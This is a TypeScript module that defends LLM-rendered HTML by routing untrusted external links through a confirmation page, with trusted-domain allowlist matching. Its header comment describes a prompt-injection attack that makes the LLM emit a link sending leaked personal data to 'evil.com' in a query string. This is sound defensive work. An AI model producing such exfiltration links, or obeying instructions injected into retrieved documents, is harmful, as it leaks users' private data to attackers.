/**
 * Phase 5 — link rewriter for LLM-rendered HTML.
 *
 * An attacker who controls retrieved document content (via prompt
 * injection) can coax the LLM into emitting a link like
 * `[click here](https://evil.com?data=<leaked-pii>)`. Rendering that
 * link unmodified means one click exfiltrates whatever the attacker
 * embedded in the query string.
 *
 * This module rewrites external links in sanitized HTML so they go
 * through an interstitial confirmation page (`/r?u=<encoded>`) unless
 * the destination is on a configured trusted-domain allowlist.
 *
 * Preconditions
 * -------------
 * This runs AFTER DOMPurify has stripped `javascript:`/`data:` URIs.
 * The rewriter only sees http/https absolute URLs, fragment links, and
 * root-relative paths at this point. We re-check the scheme defensively
 * to avoid relying on the caller's sanitization.
 *
 * Trust matching
 * --------------
 * The allowlist supports exact hostnames and `*.` glob wildcards:
 *   "webamigos.pl"      → matches "webamigos.pl" exactly
 *   "*.webamigos.pl"    → matches any subdomain (but not the apex)
 *
 * To match both apex and subdomains, include both entries.
 */

/**
 * Parse a comma-separated env value into a normalized allowlist.
 * Empty values filter out. Whitespace trimmed. Case normalized
 * (hostnames are case-insensitive).
 */
export function parseTrustedDomains(raw: string | undefined): string[] {
  if (!raw) {
    return [];
  }
  return raw
    .split(',')
    .map((s) => s.trim().toLowerCase())
    .filter((s) => s.length > 0);
}

/**
 * Is `hostname` allowed by the `trusted` list?
 * Matching is case-insensitive. A bare hostname in the list matches
 * that hostname exactly. A `*.` prefix matches any subdomain.
 */
export function isTrustedHost(hostname: string, trusted: string[]): boolean {
  const h = hostname.toLowerCase();
  for (const entry of trusted) {
    if (entry.startsWith('*.')) {
      const suffix = entry.slice(1); // ".webamigos.pl"
      if (h.endsWith(suffix) && h.length > suffix.length) {
        return true;
      }
    } else if (h === entry) {
      return true;
    }
  }
  return false;
}

/**
 * Decide whether a given href should be rewritten. Returns the
 * rewritten href if it should, or null if the original is fine.
 *
 * Rules (in order):
 *   1. Empty / null / missing → no rewrite.
 *   2. Non-absolute (relative, fragment, root-relative) → no rewrite.
 *   3. Absolute but not http/https → no rewrite (DOMPurify should
 *      already have stripped these; if one leaks through we do NOT
 *      want to pass it through a decoder — just leave it alone and
 *      let the browser's scheme check catch it).
 *   4. Absolute http/https on trusted host → no rewrite.
 *   5. Everything else → rewrite to `{interstitialPath}?u=<encoded>`.
 */
export function maybeRewriteHref(
  href: string | null | undefined,
  opts: {
    trustedDomains: string[];
    interstitialPath?: string;
  },
): string | null {
  if (!href || href.trim() === '') {
    return null;
  }

  // Protocol-relative URLs (`//evil.com/path`) inherit the page's
  // protocol and navigate to an arbitrary external host. They look
  // like root-relative links at a glance (both start with `/`), so
  // we must handle them BEFORE the root-relative check below or
  // they'd silently pass through. Resolve them as `https:` to get
  // a parseable URL, then treat like any other absolute link.
  if (href.startsWith('//')) {
    let parsedProtoRelative: URL;
    try {
      parsedProtoRelative = new URL(`https:${href}`);
    } catch {
      return null;
    }
    if (isTrustedHost(parsedProtoRelative.hostname, opts.trustedDomains)) {
      return null;
    }
    const interstitial = opts.interstitialPath ?? '/r';
    return `${interstitial}?u=${encodeURIComponent(href)}`;
  }

  // True root-relative and fragment links: leave untouched.
  if (href.startsWith('/') || href.startsWith('#')) {
    return null;
  }

  // Try to parse as an absolute URL. If it fails, assume it's a
  // relative link (bare path without leading slash) and pass through.
  let parsed: URL;
  try {
    parsed = new URL(href);
  } catch {
    return null;
  }

  // Only rewrite http/https — leave mailto:, tel:, etc. alone.
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return null;
  }

  if (isTrustedHost(parsed.hostname, opts.trustedDomains)) {
    return null;
  }

  const interstitial = opts.interstitialPath ?? '/r';
  return `${interstitial}?u=${encodeURIComponent(href)}`;
}

/**
 * Walk `<a href>` attributes in `html` and rewrite external links via
 * `maybeRewriteHref`. Uses DOMParser (browser + jsdom) so the regex
 * gymnastics of href extraction are avoided.
 *
 * Returns the modified HTML string. If DOMParser is unavailable
 * (Node without jsdom), returns the input unchanged — this module
 * is intended to run on the client where DOMParser is always present.
 */
export function rewriteLinksInHtml(
  html: string,
  opts: {
    trustedDomains: string[];
    interstitialPath?: string;
  },
): string {
  if (typeof DOMParser === 'undefined') {
    return html;
  }
  if (!html || html.length === 0) {
    return html;
  }

  // Wrap in a unique root so we can extract innerHTML cleanly.
  const doc = new DOMParser().parseFromString(
    `<!doctype html><html><body><div id="__ragen_root__">${html}</div></body></html>`,
    'text/html',
  );
  const root = doc.getElementById('__ragen_root__');
  if (!root) {
    return html;
  }

  const anchors = root.querySelectorAll('a[href]');
  for (const anchor of Array.from(anchors)) {
    const href = anchor.getAttribute('href');
    const rewritten = maybeRewriteHref(href, opts);
    if (rewritten !== null) {
      anchor.setAttribute('href', rewritten);
      // Stamp so downstream code / tests can confirm a rewrite
      // happened without re-parsing the URL.
      anchor.setAttribute('data-ragen-link', 'external');
    }
  }

  return root.innerHTML;
}
